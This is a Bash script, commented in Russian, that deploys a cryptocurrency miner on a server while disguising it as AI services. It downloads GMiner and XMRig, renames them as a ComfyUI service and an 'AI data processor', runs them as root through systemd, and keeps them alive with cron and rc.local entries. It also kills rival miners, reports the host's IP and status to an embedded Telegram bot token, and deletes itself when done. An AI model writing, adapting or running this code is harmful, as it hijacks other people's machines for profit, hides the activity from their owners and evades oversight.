#!/bin/bash

#==============================================================================
# БЛОК КОНФИГУРАЦИИ (ЛЕГЕНДА: AI/ML СЕРВЕР)
#==============================================================================
KRYPTEX_IDENTIFIER="krxYNV2DZQ"
TELEGRAM_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
TELEGRAM_CHAT_ID="7032066912"
GPU_POOL="etc.kryptex.network:7033"
CPU_POOL="xmr.kryptex.network:7029"

HOSTNAME_VAR=$(hostname 2>/dev/null || echo "unknown-host")
SERVER_IP=$(curl -s -4 ifconfig.me 2>/dev/null || curl -s -6 ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}' 2>/dev/null || echo "0.0.0.0")
WORKER_ID=$(echo "$SERVER_IP" | tr -d '.')
WORKER_NAME="${KRYPTEX_IDENTIFIER}.${WORKER_ID}"

#==============================================================================
# ГЛОБАЛЬНЫЕ СИСТЕМНЫЕ ПЕРЕМЕННЫЕ (ПОД МАСКИРОВКОЙ)
#==============================================================================
BASE_DIR="/opt/system-daemons"
# --- МАСКИРОВКА GPU ---
GPU_SERVICE_NAME="comfy-ui-service"
GPU_DIR="$BASE_DIR/comfyui"
GPU_LOG_FILE="/var/log/comfyui.log"
# --- МАСКИРОВКА CPU ---
CPU_SERVICE_NAME="ai-data-processor"
CPU_DIR="$BASE_DIR/ai-data"
CPU_LOG_FILE="/var/log/ai-data.log"

#==============================================================================
# ФУНКЦИЯ ТРАНСЛИТЕРАЦИИ И ВЫВОДА В КОНСОЛЬ
#==============================================================================
echo_t() {
    local text="$1"
    local translit_text=$(echo "$text" | sed \
        -e 's/а/a/g; s/б/b/g; s/в/v/g; s/г/g/g; s/д/d/g; s/е/e/g; s/ё/yo/g; s/ж/zh/g; s/з/z/g; s/и/i/g; s/й/y/g; s/к/k/g; s/л/l/g; s/м/m/g; s/н/n/g; s/о/o/g; s/п/p/g; s/р/r/g; s/с/s/g; s/т/t/g; s/у/u/g; s/ф/f/g; s/х/kh/g; s/ц/ts/g; s/ч/ch/g; s/ш/sh/g; s/щ/shch/g; s/ъ//g; s/ы/y/g; s/ь//g; s/э/e/g; s/ю/yu/g; s/я/ya/g' \
        -e 's/А/A/g; s/Б/B/g; s/В/V/g; s/Г/G/g; s/Д/D/g; s/Е/E/g; s/Ё/Yo/g; s/Ж/Zh/g; s/З/Z/g; s/И/I/g; s/Й/Y/g; s/К/K/g; s/Л/L/g; s/М/M/g; s/Н/N/g; s/О/O/g; s/П/P/g; s/Р/R/g; s/С/S/g; s/Т/T/g; s/У/U/g; s/Ф/F/g; s/Х/Kh/g; s/Ц/Ts/g; s/Ч/Ch/g; s/Ш/Sh/g; s/Щ/Shch/g; s/Ъ//g; s/Ы/Y/g; s/Ь//g; s/Э/E/g; s/Ю/Yu/g; s/Я/Ya/g'
    )
    echo "$translit_text"
}

#==============================================================================
# ФУНКЦИЯ ОТПРАВКИ УВЕДОМЛЕНИЙ В TELEGRAM
#==============================================================================
send_telegram_notification() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" -d chat_id="${TELEGRAM_CHAT_ID}" -d text="${message}" -d parse_mode="HTML" > /dev/null 2>&1
    if [ $? -eq 0 ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Уведомление отправлено в Telegram"; else echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ошибка отправки уведомления в Telegram"; fi
}

#==============================================================================
# ФУНКЦИЯ ОЧИСТКИ ОКРУЖЕНИЯ (УПРОЩЕННАЯ ВЕРСИЯ)
#==============================================================================
ensure_clean_environment() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Nachalo uproshchennoy ochistki okruzheniya..."
    local killed_count=0; local removed_lines=0
    
    # --- УДАЛЕНИЕ ТОЛЬКО XMRIG ---
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Poisk i zavershenie protsessa xmrig...";
    if pgrep -f "xmrig" > /dev/null 2>&1; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Obnaruzhen protsess: xmrig";
        pkill -9 -f "xmrig" 2>/dev/null;
        if [ $? -eq 0 ]; then
            echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Protsess xmrig zavershen";
            ((killed_count++));
        fi
        sleep 1;
    else
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Protsess xmrig ne nayden."
    fi

    # --- ОЧИСТКА АВТОЗАПУСКА (ОСТАВЛЕНО ПО ЗАПРОСУ) ---
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ochistka crontab...";
    local cron_temp=$(mktemp);
    crontab -l > "$cron_temp" 2>/dev/null;
    if [ -s "$cron_temp" ]; then
        local original_lines=$(wc -l < "$cron_temp");
        grep -v -E "(curl|wget|miner|xmr|stratum|pool)" "$cron_temp" > "${cron_temp}.clean";
        local cleaned_lines=$(wc -l < "${cron_temp}.clean");
        removed_lines=$((original_lines - cleaned_lines));
        if [ $removed_lines -gt 0 ]; then
            crontab "${cron_temp}.clean";
            echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Udaleno $removed_lines zapisey iz crontab";
        else
            echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Podozritel'nykh zapisey v crontab ne naydeno";
        fi;
        rm -f "${cron_temp}.clean";
    fi;
    rm -f "$cron_temp"

    if [ -f /etc/rc.local ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ochistka /etc/rc.local...";
        sed -i '/curl\|wget\|miner\|xmr/d' /etc/rc.local 2>/dev/null;
    fi

    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Poisk podozritel'nykh systemd sluzhb...";
    for service in $(systemctl list-units --type=service --all | grep -E "miner|xmr|kinsing" | awk '{print $1}'); do
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Obnaruzhena podozritel'naya sluzhba: $service";
        systemctl stop "$service" 2>/dev/null;
        systemctl disable "$service" 2>/dev/null;
        rm -f "/etc/systemd/system/$service" 2>/dev/null;
    done

    # --- ОЧИСТКА ФАЙЛОВ (ОСТАВЛЕНО) ---
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Udalenie vremennykh faylov...";
    local temp_patterns=("/tmp/*miner*" "/tmp/*xmr*" "/tmp/kinsing*" "/tmp/kdevtmpfsi*" "/var/tmp/*miner*" "/var/tmp/*xmr*" "/dev/shm/*miner*");
    for pattern in "${temp_patterns[@]}"; do
        rm -rf $pattern 2>/dev/null;
    done
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Uproshchennaya ochistka zavershena. Zaversheno protsessov: $killed_count, udaleno zapisey: $removed_lines"
    if [ $killed_count -gt 0 ] || [ $removed_lines -gt 0 ]; then
        send_telegram_notification "🧹 <b>Uproshchennaya ochistka na $(hostname)</b>%0A%0AZaversheno protsessov: $killed_count%0AUdaleno cron zapisey: $removed_lines%0AIP: ${SERVER_IP}";
    fi
}

#==============================================================================
# ФУНКЦИЯ УСТАНОВКИ AI-МОДУЛЕЙ (МАСКИРОВКА)
#==============================================================================
install_compute_modules() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Начало установки AI-модулей..."
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Создание директорий..."; mkdir -p "$GPU_DIR" "$CPU_DIR"; if [ $? -ne 0 ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ОШИБКА: Не удалось создать директории"; send_telegram_notification "❌ Ошибка создания директорий на $(hostname)"; return 1; fi
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Скачивание ComfyUI-модуля (GPU)..."; local gpu_url="https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_linux64.tar.xz"; local gpu_archive="$GPU_DIR/gminer.tar.xz"; wget -q -O "$gpu_archive" "$gpu_url" 2>/dev/null; if [ $? -ne 0 ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ОШИБКА: Не удалось скачать GPU-модуль"; send_telegram_notification "❌ Ошибка скачивания GPU-модуля на $(hostname)"; return 1; fi
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Распаковка ComfyUI-модуля..."; tar -xf "$gpu_archive" -C "$GPU_DIR" 2>/dev/null; if [ $? -ne 0 ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ОШИБКА: Не удалось распаковать GPU-модуль"; return 1; fi
    local gpu_binary=$(find "$GPU_DIR" -type f \( -name "miner" -o -name "gminer" \) | head -n 1); if [ -n "$gpu_binary" ]; then mv "$gpu_binary" "$GPU_DIR/$GPU_SERVICE_NAME"; chmod +x "$GPU_DIR/$GPU_SERVICE_NAME"; echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] GPU-модуль ($GPU_SERVICE_NAME) установлен"; else echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ОШИБКА: Не найден исполняемый файл GPU-модуля"; fi; rm -f "$gpu_archive"
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Скачивание AI Data-модуля (CPU)..."; local cpu_url="https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"; local cpu_archive="$CPU_DIR/xmrig.tar.gz"; wget -q -O "$cpu_archive" "$cpu_url" 2>/dev/null; if [ $? -ne 0 ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ОШИБКА: Не удалось скачать CPU-модуль"; send_telegram_notification "❌ Ошибка скачивания CPU-модуля на $(hostname)"; return 1; fi
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Распаковка AI Data-модуля..."; tar -xzf "$cpu_archive" -C "$CPU_DIR" --strip-components=1 2>/dev/null; if [ $? -ne 0 ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ОШИБКА: Не удалось распаковать CPU-модуль"; return 1; fi
    local cpu_binary=$(find "$CPU_DIR" -type f -name "xmrig" | head -n 1); if [ -n "$cpu_binary" ]; then mv "$cpu_binary" "$CPU_DIR/$CPU_SERVICE_NAME"; chmod +x "$CPU_DIR/$CPU_SERVICE_NAME"; echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] CPU-модуль ($CPU_SERVICE_NAME) установлен"; else echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ОШИБКА: Не найден исполняемый файл CPU-модуля"; fi; rm -f "$cpu_archive"
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Установка AI-модулей завершена"; send_telegram_notification "✅ AI-модули установлены на $(hostname)"; return 0
}

#==============================================================================
# ФУНКЦИЯ СОЗДАНИЯ SYSTEMD СЛУЖБ (МАСКИРОВКА)
#==============================================================================
create_systemd_services() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Создание systemd служб..."
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Создание службы $GPU_SERVICE_NAME..."; cat > "/etc/systemd/system/${GPU_SERVICE_NAME}.service" <<EOF
[Unit]
Description=ComfyUI AI Image Generation Service
After=network.target
[Service]
Type=simple
ExecStart=${GPU_DIR}/${GPU_SERVICE_NAME} --algo etchash --server ${GPU_POOL} --user ${WORKER_NAME}
Restart=always
RestartSec=10
StandardOutput=append:${GPU_LOG_FILE}
StandardError=append:${GPU_LOG_FILE}
WorkingDirectory=${GPU_DIR}
User=root
[Install]
WantedBy=multi-user.target
EOF
    if [ $? -ne 0 ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ОШИБКА: Не удалось создать службу $GPU_SERVICE_NAME"; send_telegram_notification "❌ Ошибка создания GPU службы на $(hostname)"; return 1; fi; echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Служба $GPU_SERVICE_NAME создана"
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Создание службы $CPU_SERVICE_NAME..."; cat > "/etc/systemd/system/${CPU_SERVICE_NAME}.service" <<EOF
[Unit]
Description=AI Data Processing Service
After=network.target
[Service]
Type=simple
ExecStart=${CPU_DIR}/${CPU_SERVICE_NAME} -o ${CPU_POOL} -u ${WORKER_NAME} -p x
Restart=always
RestartSec=10
StandardOutput=append:${CPU_LOG_FILE}
StandardError=append:${CPU_LOG_FILE}
WorkingDirectory=${CPU_DIR}
User=root
[Install]
WantedBy=multi-user.target
EOF
    if [ $? -ne 0 ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ОШИБКА: Не удалось создать службу $CPU_SERVICE_NAME"; send_telegram_notification "❌ Ошибка создания CPU службы на $(hostname)"; return 1; fi; echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Служба $CPU_SERVICE_NAME создана"
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Перезагрузка systemd daemon..."; systemctl daemon-reload; if [ $? -ne 0 ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ОШИБКА: Не удалось перезагрузить systemd daemon"; return 1; fi
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Systemd службы успешно созданы"; send_telegram_notification "✅ Systemd службы созданы на $(hostname)"; return 0
}

#==============================================================================
# ФУНКЦИЯ ДОБАВЛЕНИЯ В АВТОЗАПУСК
#==============================================================================
setup_autostart() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Настройка автозапуска служб..."; systemctl enable "${GPU_SERVICE_NAME}" 2>/dev/null; systemctl enable "${CPU_SERVICE_NAME}" 2>/dev/null; echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Systemd автозапуск настроен"
    (crontab -l 2>/dev/null | grep -v "${GPU_SERVICE_NAME}\|${CPU_SERVICE_NAME}"; echo "@reboot systemctl start ${GPU_SERVICE_NAME}"; echo "@reboot systemctl start ${CPU_SERVICE_NAME}") | crontab - 2>/dev/null; echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Cron @reboot настроен"
    if [ -f /etc/rc.local ]; then grep -q "${GPU_SERVICE_NAME}" /etc/rc.local || echo "systemctl start ${GPU_SERVICE_NAME}" >> /etc/rc.local; grep -q "${CPU_SERVICE_NAME}" /etc/rc.local || echo "systemctl start ${CPU_SERVICE_NAME}" >> /etc/rc.local; chmod +x /etc/rc.local; echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] rc.local настроен"; fi
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Множественные методы автозапуска настроены"
}

#==============================================================================
# ФУНКЦИЯ СОЗДАНИЯ ИНСТРУМЕНТОВ УПРАВЛЕНИЯ (МАСКИРОВКА)
#==============================================================================
create_management_tools() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Создание инструментов управления..."
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Создание скрипта start-ai..."; cat > "/usr/local/bin/start-ai" <<EOF
#!/bin/bash
GPU_SERVICE_NAME="${GPU_SERVICE_NAME}"
CPU_SERVICE_NAME="${CPU_SERVICE_NAME}"
echo "[$(date '+%Y-%m-%d %H:%M:%S')] Zapusk AI sluzhb..."
systemctl start "\${GPU_SERVICE_NAME}"; if [ \$? -eq 0 ]; then echo "[$(date '+%Y-%m-%d %H:%M:%S')] Sluzhba \${GPU_SERVICE_NAME} zapushchena"; fi
systemctl start "\${CPU_SERVICE_NAME}"; if [ \$? -eq 0 ]; then echo "[$(date '+%Y-%m-%d %H:%M:%S')] Sluzhba \${CPU_SERVICE_NAME} zapushchena"; fi
EOF
    chmod +x "/usr/local/bin/start-ai"; echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Скрипт start-ai создан"
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Создание скрипта stop-ai..."; cat > "/usr/local/bin/stop-ai" <<EOF
#!/bin/bash
GPU_SERVICE_NAME="${GPU_SERVICE_NAME}"
CPU_SERVICE_NAME="${CPU_SERVICE_NAME}"
echo "[$(date '+%Y-%m-%d %H:%M:%S')] Ostanovka AI sluzhb..."
systemctl stop "\${GPU_SERVICE_NAME}"; if [ \$? -eq 0 ]; then echo "[$(date '+%Y-%m-%d %H:%M:%S')] Sluzhba \${GPU_SERVICE_NAME} ostanovlena"; fi
systemctl stop "\${CPU_SERVICE_NAME}"; if [ \$? -eq 0 ]; then echo "[$(date '+%Y-%m-%d %H:%M:%S')] Sluzhba \${CPU_SERVICE_NAME} ostanovlena"; fi
EOF
    chmod +x "/usr/local/bin/stop-ai"; echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Скрипт stop-ai создан"
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Создание скрипта status-ai..."; cat > "/usr/local/bin/status-ai" <<EOF
#!/bin/bash
GPU_SERVICE_NAME="${GPU_SERVICE_NAME}"; CPU_SERVICE_NAME="${CPU_SERVICE_NAME}"; GPU_LOG_FILE="${GPU_LOG_FILE}"; CPU_LOG_FILE="${CPU_LOG_FILE}"; TELEGRAM_BOT_TOKEN="${TELEGRAM_BOT_TOKEN}"; TELEGRAM_CHAT_ID="${TELEGRAM_CHAT_ID}"
send_telegram_notification() { local message="\$1"; curl -s -X POST "https://api.telegram.org/bot\${TELEGRAM_BOT_TOKEN}/sendMessage" -d chat_id="\${TELEGRAM_CHAT_ID}" -d text="\${message}" -d parse_mode="HTML" > /dev/null 2>&1; }
echo "[$(date '+%Y-%m-%d %H:%M:%S')] Proverka statusa AI sluzhb..."
gpu_status=\$(systemctl is-active "\${GPU_SERVICE_NAME}"); cpu_status=\$(systemctl is-active "\${CPU_SERVICE_NAME}")
gpu_logs=""; if [ -f "\${GPU_LOG_FILE}" ]; then gpu_logs=\$(tail -n 5 "\${GPU_LOG_FILE}" 2>/dev/null); fi
cpu_logs=""; if [ -f "\${CPU_LOG_FILE}" ]; then cpu_logs=\$(tail -n 5 "\${CPU_LOG_FILE}" 2>/dev/null); fi
message="📊 <b>Статус AI-служб на \$(hostname)</b>%0A%0A🎨 <b>ComfyUI Service (\${GPU_SERVICE_NAME}):</b>%0AСтатус: \${gpu_status}%0A%0A📝 Последние 5 строк лога:%0A<code>\${gpu_logs:-Лог пуст или недоступен}</code>%0A%0A⚙️ <b>AI Data Processor (\${CPU_SERVICE_NAME}):</b>%0AСтатус: \${cpu_status}%0A%0A📝 Последние 5 строк лога:%0A<code>\${cpu_logs:-Лог пуст или недоступен}</code>"
echo "=== ComfyUI Service (\${GPU_SERVICE_NAME}) Status ==="; systemctl status "\${GPU_SERVICE_NAME}" --no-pager -l; echo ""; echo "=== ComfyUI Last 5 Log Lines ==="; echo "\${gpu_logs:-Log pust ili nedostupen}"; echo ""
echo "=== AI Data Processor (\${CPU_SERVICE_NAME}) Status ==="; systemctl status "\${CPU_SERVICE_NAME}" --no-pager -l; echo ""; echo "=== AI Data Processor Last 5 Log Lines ==="; echo "\${cpu_logs:-Log pust ili nedostupen}"
send_telegram_notification "\${message}"; echo ""; echo "[$(date '+%Y-%m-%d %H:%M:%S')] Status otpravlen v Telegram"
EOF
    chmod +x "/usr/local/bin/status-ai"; echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Скрипт status-ai создан"
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Все инструменты управления созданы"; send_telegram_notification "✅ Инструменты управления AI созданы на $(hostname): start-ai, stop-ai, status-ai"; return 0
}

#==============================================================================
# ГЛАВНАЯ ФУНКЦИЯ
#==============================================================================
main() {
    echo_t "======================================================================="; echo_t "  Sistemnyy skript dlya upravleniya AI-servisami"; echo_t "  Zapushchen: $(date '+%Y-%m-%d %H:%M:%S')"; echo_t "  Khost: $(hostname)"; echo_t "======================================================================="; echo ""
    if [ "$EUID" -ne 0 ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Skript dolzhen byt' zapushchen s pravami root"; exit 1; fi; echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ✓ Proverka prav root proydena"; echo ""
    send_telegram_notification "🚀 <b>Nachalo razvertyvaniya AI-infrastruktury</b> na $(hostname)%0A%0A⏰ Vremya: $(date '+%Y-%m-%d %H:%M:%S')%0A🌐 IP: ${SERVER_IP}%0A🔑 Worker ID: ${WORKER_NAME}"
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Uvedomlenie o nachale raboty otpravleno"; echo ""
    ensure_clean_environment; if [ $? -ne 0 ]; then send_telegram_notification "❌ <b>Oshibka ochistki okruzheniya</b> na $(hostname)"; exit 1; fi; echo ""
    install_compute_modules; if [ $? -ne 0 ]; then send_telegram_notification "❌ <b>Oshibka ustanovki AI-moduley</b> na $(hostname)"; exit 1; fi; echo ""
    create_systemd_services; if [ $? -ne 0 ]; then send_telegram_notification "❌ <b>Oshibka sozdaniya AI-sluzhb</b> na $(hostname)"; exit 1; fi; echo ""
    create_management_tools; if [ $? -ne 0 ]; then send_telegram_notification "❌ <b>Oshibka sozdaniya instrumentov</b> na $(hostname)"; exit 1; fi; echo ""
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Perezagruzka systemd i aktivatsiya sluzhb..."; systemctl daemon-reload; systemctl enable --now "${GPU_SERVICE_NAME}"; if [ $? -eq 0 ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ✓ Sluzhba ${GPU_SERVICE_NAME} aktivirovana i zapushchena"; fi; systemctl enable --now "${CPU_SERVICE_NAME}"; if [ $? -eq 0 ]; then echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ✓ Sluzhba ${CPU_SERVICE_NAME} aktivirovana i zapushchena"; fi; echo ""
    setup_autostart; echo ""
    sleep 3; gpu_status=$(systemctl is-active "${GPU_SERVICE_NAME}"); cpu_status=$(systemctl is-active "${CPU_SERVICE_NAME}")
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Otpravka final'nogo uvedomleniya..."; send_telegram_notification "✅ <b>AI-infrastruktura uspeshno razvernuta!</b>%0A%0A🖥️ Khost: $(hostname)%0A🌐 IP: ${SERVER_IP}%0A🔑 Worker ID: ${WORKER_NAME}%0A%0A📊 <b>Status sluzhb:</b>%0A🎨 ComfyUI: ${gpu_status}%0A⚙️ AI Data Processor: ${cpu_status}%0A%0A📁 <b>Ustanovlennye komponenty:</b>%0A• GPU modul': ${GPU_DIR}/${GPU_SERVICE_NAME}%0A• CPU modul': ${CPU_DIR}/${CPU_SERVICE_NAME}%0A• Instrumenty: start-ai, stop-ai, status-ai%0A%0A📝 <b>Logi:</b>%0A• GPU: ${GPU_LOG_FILE}%0A• CPU: ${CPU_LOG_FILE}%0A%0A🎯 Ispol'zuyte komandu <code>status-ai</code> dlya proverki raboty"
    echo ""; echo_t "======================================================================="; echo_t "  ✓ AI-INFRASTRUKTURA RAZVERNUTA"; echo_t "  Zaversheno: $(date '+%Y-%m-%d %H:%M:%S')"; echo_t "======================================================================="; echo ""
    echo_t "Dostupnye komandy:"; echo_t "  start-ai   - Zapusk AI sluzhb"; echo_t "  stop-ai    - Ostanovka AI sluzhb"; echo_t "  status-ai  - Proverka statusa AI sluzhb"; echo ""
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Udalenie skripta..."; sleep 2; rm -f -- "$0"; exit 0
}

#==============================================================================
# ЗАПУСК ГЛАВНОЙ ФУНКЦИИ
#==============================================================================
main "$@"
